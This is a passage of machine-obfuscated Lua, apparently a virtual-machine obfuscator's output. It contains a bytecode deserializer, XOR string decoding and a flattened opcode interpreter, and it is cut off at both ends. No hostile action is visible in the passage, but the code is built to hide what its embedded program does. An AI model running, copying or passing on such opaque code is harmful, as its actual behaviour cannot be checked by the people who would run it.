de<5 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if(cx>bw)then local bw=cw while true do bw=bw+cu if not(not(bw==ct))then break else return by end end end else if 1<cs then cy=(((cy-bk)%bs))else cx=(cx+cu)end end else if cs<=3 then if(((cy%bi)==bj or((cy%bi)>bj)))then local bi=cw while true do bi=bi+cu if((bi==ct or bi>ct))then if((bi<bh))then return cc else break end else cy=((cy*bg)%be)end end else local be=cw while true do be=((be+cu))if((be<ct))then return by(bz((ce and bz),by and bz,(cc and by),by),(ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc)),(cc(ce,by and ce,by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if cs~=5 then return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,((by and by)),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if((cx>bf))then local bf=cw while true do bf=(bf+cu)if bf<ct then return bj else break end end end else if bk==1 then cx=cx+cu else cy=(((cy+y)%x))end end else if bk<=3 then if(((cy%v)>w)or not((cy%v)~=w))then local v=cw while true do v=((v+cu))if((v<cu or not(v~=cu)))then cy=(((cy-ca)%s))else if not(v~=bh)then break else return bj end end end else local s=cw while true do s=((s+cu))if not((s~=ct))then break else return bi(be(bi,(be and bi),bg,bj),(bj(bi,be,bg,bi)and bg(bj,(bj and bi),bg,bi and bj)),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if 4<bk then break else return be(bi(bg and bj,bg,(bg and be),((bj and bi))),bj(be,bi,bj,bi),bj((bj and bi),((bi and bi)),bg,bi),be(bi,bj,bg,bj))end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if cx>q then local q=cw while true do q=(q+cu)if(q<ct)then return x else break end end end else if 2~=y then cx=cx+cu else cy=(((cy*p))%d)end end else if y<=3 then if((((cy%c))>b))then local b=cw while true do b=b+cu if((b<ct))then return s(w(x,s,s,((v and w))),(s(s,w,v,(v and s))and x(v,x,x,v)),v(s,x,s,((w and s))),w(s,w,s,w)and s(v,w,s,(s and x)))else break end end else local b=cw while true do b=b+cu if not((b~=ct))then break else return v end end end else if y~=5 then return x else break end end end y=y+1 end end)else if a==31 then return cy;else break end end end end end end a=a+1 end end)()));else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 0==a then b,c=cf(),cf()else if b==0 and c==0 then return 0;end;end else if a>2 then p=(cd(c,1,20)*(2^32))+b else d=1 end end else if a<=5 then if a>4 then s=(((-1)^cd(c,32)))else q=cd(c,21,31)end else if a<=6 then if(not(q~=0))then if(not(p~=0))then return s*0;else q=1;d=0;end;elseif((q==2047))then if(not(p~=0))then return(s*((1/0)));else return(s*(0/0));end;end;else if 7<a then break else return s*(2^((q-1023)))*((d+(p/(2^52))))end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd~=31 then cm=function()local a,b,c=0 while true do if a<=1 then if a<1 then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 4>a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 33~=bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a<2 then c=157 else d=0 end end else if a<=3 then p={}else if a~=5 then while(d<8)do d=d+1;while d<707 and c%1622<811 do c=((c*35))local q=(d+c)if(((c%16522)<8261))then c=((c*19))while((d<828)and(c%658<329))do c=((c+60))local q=(d+c)if((((c%18428))==9214)or(((c%18428))<9214))then c=((c-50))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(not(q==0))then return g;end;b=j(bn,br,((br+q-1)));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if 0<v then break else return i(h(q))end v=v+1 end end end s=s+1 end end);end elseif(c%4~=0)then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(v==1)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=(c*88)d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 1>v then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=((d+1));end elseif not((c%4==0))then c=((c-48))while((d<859)and c%1392<696)do c=((c*39))local q=(d+c)if((c%58)<29)then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(c%4==0)then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if v>0 then break else return i(h(q))end v=(v+1)end end end s=s+1 end end);end else c=((c*9))d=d+1 local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(1==v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=((d+1))while((d<663)and((c%936)<468))do c=(((c*12)))local q=(d+c)if((c%18532)>=9266)then c=((c*71))local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(c%4==0)then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(1~=v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=((c*35))d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 1==p then while true do if not(q~=0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=d+1;end end;d=(d+1);end c=((c-494))if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a>0 then break else return{...},n("\35",...)end a=a+1 end end else if bd~=36 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})else b,c,d,p={},{},{},{}end else if a<=2 then s={}else if a<4 then v=490 else w=0 end end end else if a<=6 then if a<6 then x={}else while w<3 do w=((w+1));while(w<481 and v%320<160)do v=(v*62)local d=(w+v)if((v%916)>458)then v=((v-88))while(w<318)and(v%702)<351 do v=(((v*8)))local d=((w+v))if((v%14064)>7032)then v=(v*81)local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(j~=0))then s[d]=nil;elseif(not(j~=1))then s[d]=(not(not(cg()~=0)));elseif(((j==3)))then s[d]=ck();elseif(not(not(j==2)))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(not((v%4)~=0))then v=(((v*65)))while w<615 and v%618<309 do v=(v-33)local d=(w+v)if(((v%15582)>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not((v%4)~=0))then v=((v+51))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=(v+7)w=(w+1)while((w<127 and((v%1548)<774)))do v=((v-37))local d=(w+v)if((v%19188)>9594)then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=(w+1)local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=w+1;end v=((v*482))if(w>56)then break;end;end;end else if a<=7 then for d=1,cf()do c[(d-1)]=cr();end;else if 9>a then q[481]=cg();else v=932 end end end end else if a<=14 then if a<=11 then if 11~=a then w=0 else x={}end else if a<=12 then while(w<9)do w=((w+1));while(((w<204))and((((v%1492))<746)))do v=((v*84))local c=w+v if(v%8160)<=4080 then v=(((v-4)))while((w<404 and v%240<120))do v=(v*67)local c=(w+v)if((((v%1294)>647)or(v%1294)==647))then v=((v*90))local c=49652 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if(not(bb~=0))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[523]=cm(),[616]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if((not((y~=0)))or(not(y~=c)))then be[222]=cf();if(not(not(not(y~=0))))then be[728]=cf();end;elseif(not(y~=d))or(not(not(y==j)))then be[222]=((cf()-(e)));if(not((y~=j)))then be[728]=cm();end;end;if(not(not(cd(bb,c,c)==c)))then be[616]=s[be[616]];end;if((cd(bb,d,d)==c))then be[222]=s[be[222]];end;if((cd(bb,j,j)==c))then be[728]=s[be[728]];end;b[p]=be;end;end;end elseif(v%4~=0)then v=((v+68))local b=48618 if not x[b]then x[b]=1;end else v=(((v-36)))w=w+1 local b=87490 if not x[b]then x[b]=1;end end;w=((w+1));end elseif not(not((v%4)~=0))then v=(v+18)while(((w<55)and v%1856<928))do v=(v-52)local b=(w+v)if(((v%10162))>5081)then v=(((v-73)))local b=8296 if not x[b]then x[b]=1;end elseif(v%4~=0)then v=((v-30))local b=32944 if not x[b]then x[b]=1;end else v=((v-17))w=(w+1)local b=37823 if not x[b]then x[b]=1;end end;w=((w+1));end else v=((v+70))w=w+1 while(w<325)and v%1642<821 do v=(((v-19)))local b=((w+v))if(v%13354)<=6677 then v=((v*37))local b=3350 if not x[b]then x[b]=1;end elseif v%4~=0 then v=(((v-56)))local b=7491 if not x[b]then x[b]=1;end else v=(v+90)w=(w+1)local b=71276 if not x[b]then x[b]=1;end end;w=w+1;end end;w=((w+1));end v=(v*488)if w>93 then break;end;end;else if a~=14 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[616],b[222],b[728]if not(not(bp(c)==f))then c=z(c,cl,function(j,p,p)local p,s=0 while true do if p<=0 then s=0 else if 2>p then while true do if not(s==1)then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[616]=c end if not(not((bp(d)==f)))then d=z(d,cl,function(c,j)local j,p=0 while true do if j<=0 then p=0 else if j==1 then while true do if p<1 then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[222]=d end if((bp(e)==f))then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if d>1 then break else while true do if 1>j then return i(bu(h(c),cb))else break end j=(j+1)end end end d=d+1 end end)b[728]=e end;end;q[cj]=nil;end;else v=790 end end end else if a<=16 then if 15<a then x={}else w=0 end else if a<=17 then while w<6 do w=((w+1));while(((w<284)and v%1988<994))do v=(v-20)local b=((w+v))if(((((v%16124)))>8062 or(((v%16124))==8062)))then v=(v+73)while(w<623 and v%384<192)do v=((v+13))local b=((w+v))if((v%7786)<3893 or(v%7786)==3893)then v=((v*34))local b=97985 if not x[b]then x[b]=1;return q end elseif not(not(v%4~=0))then v=((v-23))local b=1849 if not x[b]then x[b]=1;return q end else v=(((v*16)))w=(w+1)local b=9370 if not x[b]then x[b]=1;return q end end;w=((w+1));end elseif not(not(v%4~=0))then v=((v-6))while(w<732 and v%820<410)do v=(v-93)local b=(w+v)if(((v%1318)==659 or(v%1318)>659))then v=(v+23)local b=76663 if not x[b]then x[b]=1;end elseif not((v%4)==0)then v=((v+52))local b=17028 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b<2 then while true do if(c<=2)then if(c<0 or c==0)then d=n(1,...)else if(c<2)then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<=3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i==1 then while true do if j<=1 then if(j<1)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if not(3==j)then return false else break end end j=(j+1)end else break end end i=i+1 end end else if c>4 then break else for d=0,#e do if not(not(bp(e[d])==bq))then return h(e[d])end end end end end c=c+1 end else break end end b=b+1 end end end else v=((v+69))w=((w+1))local b=97169 if not x[b]then x[b]=1;end end;w=((w+1));end else v=((v-37))w=(w+1)while(((w<397)and(v%826<413)))do v=((v-86))local b=((w+v))if((v%2580)==1290 or(v%2580)>1290)then v=((v-25))local b=59985 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=(((v-20)))local b=57933 if not x[b]then x[b]=1;return q end else v=((v+90))w=(w+1)local b=46325 if not x[b]then x[b]=1;return q end end;w=((w+1));end end;w=w+1;end v=(((v+1001)))if(w>70)then break;end;end;else if a<19 then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[523];if z<=192 then if 95>=z then if 47>=z then if z<=23 then if 11>=z then if 5>=z then if(2>z or 2==z)then if(0>=z)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w[y[616]]={};else n=n+1;end end else if ba<=4 then if 3==ba then y=f[n];else w[y[616]]=h[y[222]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[616]]=w[y[222]][y[728]];else if ba>8 then y=f[n];else n=n+1;end end else if ba<=11 then if ba<11 then w[y[616]][y[222]]=w[y[728]];else n=n+1;end else if ba==12 then y=f[n];else w[y[616]]=j[y[222]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if ba>15 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end else if ba<=18 then if 18>ba then n=n+1;else y=f[n];end else if 20~=ba then w[y[616]]=j[y[222]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if 23>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if ba<=25 then if ba==24 then y=f[n];else bb=y[616]end else if 27>ba then w[bb]=w[bb]()else break end end end end end ba=ba+1 end elseif not(z==2)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[616]]=w[y[222]];else n=n+1;end else if 7~=ba then y=f[n];else w[y[616]]=h[y[222]];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[616]]=w[y[222]][w[y[728]]];end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[616]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[616]]=j[y[222]];end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[616]]=w[y[222]][y[728]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[616]end else if ba<=17 then bb=0;else if ba<19 then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(3>=z)then local ba,bb=0 while true do if(ba<=36)then if(ba==17 or ba<17)then if ba<=8 then if(ba<3 or ba==3)then if(ba==1 or ba<1)then if(0==ba)then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if(ba==2)then n=n+1;else y=f[n];end end else if(ba<5 or ba==5)then if(4<ba)then n=(n+1);else w[y[616]]=j[y[222]];end else if(ba<6 or ba==6)then y=f[n];else if(8>ba)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if(ba==12 or ba<12)then if(ba<10 or ba==10)then if ba>9 then w[y[616]]=h[y[222]];else y=f[n];end else if 12~=ba then n=(n+1);else y=f[n];end end else if(ba==14 or ba<14)then if(ba==13)then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if(ba<15 or ba==15)then y=f[n];else if(ba<17)then w[y[616]]=w[y[222]][w[y[728]]];else n=(n+1);end end end end end else if ba<=26 then if(ba<=21)then if(ba<19 or ba==19)then if(ba>18)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end else if not(ba==21)then n=(n+1);else y=f[n];end end else if(ba==23 or ba<23)then if ba>22 then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if(ba==24 or ba<24)then y=f[n];else if(25==ba)then w[y[616]]=j[y[222]];else n=(n+1);end end end end else if(ba==31 or ba<31)then if ba<=28 then if ba~=28 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=29 then n=(n+1);else if not(ba~=30)then y=f[n];else w[y[616]]=h[y[222]];end end end else if ba<=33 then if 32<ba then y=f[n];else n=n+1;end else if ba<=34 then w[y[616]]=w[y[222]][y[728]];else if ba~=36 then n=n+1;else y=f[n];end end end end end end else if(ba<54 or ba==54)then if ba<=45 then if(ba<=40)then if ba<=38 then if not(ba==38)then w[y[616]]=w[y[222]][w[y[728]]];else n=(n+1);end else if ba==39 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if(ba<=42)then if(ba==41)then n=(n+1);else y=f[n];end else if ba<=43 then w[y[616]]=w[y[222]][y[728]];else if(ba<45)then n=n+1;else y=f[n];end end end end else if(ba<49 or ba==49)then if(ba<47 or ba==47)then if ba<47 then w[y[616]]=j[y[222]];else n=n+1;end else if not(48~=ba)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if(ba<51 or ba==51)then if(50<ba)then y=f[n];else n=n+1;end else if(ba==52 or ba<52)then w[y[616]]=h[y[222]];else if 54>ba then n=(n+1);else y=f[n];end end end end end else if(ba==63 or ba<63)then if(ba<58 or ba==58)then if(ba<56 or ba==56)then if ba>55 then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if 57<ba then w[y[616]]=w[y[222]][w[y[728]]];else y=f[n];end end else if(ba<60 or ba==60)then if not(ba==60)then n=n+1;else y=f[n];end else if(ba<=61)then w[y[616]]=w[y[222]][y[728]];else if not(62~=ba)then n=(n+1);else y=f[n];end end end end else if ba<=68 then if(ba<=65)then if 64<ba then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if(ba<=66)then y=f[n];else if 68>ba then bb=y[616];else do return w[bb](r(w,(bb+1),y[222]))end;end end end else if(ba==70 or ba<70)then if(69<ba)then y=f[n];else n=(n+1);end else if(ba<=71)then bb=y[616];else if ba>72 then break else do return r(w,bb,p)end;end end end end end end end ba=ba+1 end elseif 4==z then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end else if ba<=4 then if 4>ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if 5<ba then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if 8>ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 9==ba then y=f[n];else w[y[616]]=w[y[222]]*y[728];end end else if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if 14~=ba then w[y[616]]=w[y[222]]+w[y[728]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if ba==15 then y=f[n];else w[y[616]]=j[y[222]];end else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=20 then if 20~=ba then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 21==ba then y=f[n];else w[y[616]]=w[y[222]];end end end else if ba<=26 then if ba<=24 then if 23==ba then n=n+1;else y=f[n];end else if ba<26 then w[y[616]]=w[y[222]]+w[y[728]];else n=n+1;end end else if ba<=28 then if 27==ba then y=f[n];else bb=y[616]end else if ba==29 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end end ba=ba+1 end else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 3>ba then y=f[n];else w[y[616]][y[222]]=w[y[728]];end end else if ba<=5 then if 5>ba then n=n+1;else y=f[n];end else if ba==6 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba==8 then y=f[n];else w[y[616]]=h[y[222]];end else if ba==10 then n=n+1;else y=f[n];end end else if ba<=13 then if 12<ba then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if ba<=14 then y=f[n];else if 15==ba then if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;else break end end end end end ba=ba+1 end end;elseif 8>=z then if 6>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[616]]=false;end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[616]else if ba~=18 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif z==7 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];bc=y[222];bb=y[728];ba=k(w,g,bc,bb);w[y[616]]=ba;else w[y[616]]=false;end;elseif z<=9 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif z==10 then local ba=y[616];do return r(w,ba,p)end;else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](w[ba+1])end;elseif 17>=z then if z<=14 then if 12>=z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];bc=y[222];bb=y[728];ba=k(w,g,bc,bb);w[y[616]]=ba;elseif z~=14 then local ba;w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](w[ba+1])end;elseif z<=15 then if(w[y[616]]<=w[y[728]])then n=n+1;else n=y[222];end;elseif z~=17 then w[y[616]]=false;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;else local ba=y[616];do return r(w,ba,p)end;end;elseif 20>=z then if z<=18 then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]]*y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+w[y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))elseif 20>z then local ba;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba;local bb,bc;local bd;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];bd=y[616]bb,bc=i(w[bd](r(w,bd+1,y[222])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif z<=21 then local ba;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](w[ba+1])elseif 22<z then local ba=y[616]w[ba](r(w,ba+1,p))else local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](w[ba+1])end;elseif 35>=z then if z<=29 then if 26>=z then if z<=24 then do return w[y[616]]end elseif 26>z then local ba;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba=y[616];local bb=w[ba];for bc=ba+1,y[222]do t(bb,w[bc])end;end;elseif z<=27 then if w[y[616]]then n=(n+1);else n=y[222];end;elseif z==28 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb,bc;local bd;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];bd=y[616]bb,bc=i(w[bd](r(w,bd+1,y[222])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif 32>=z then if 30>=z then local ba;w={};for bb=0,u,1 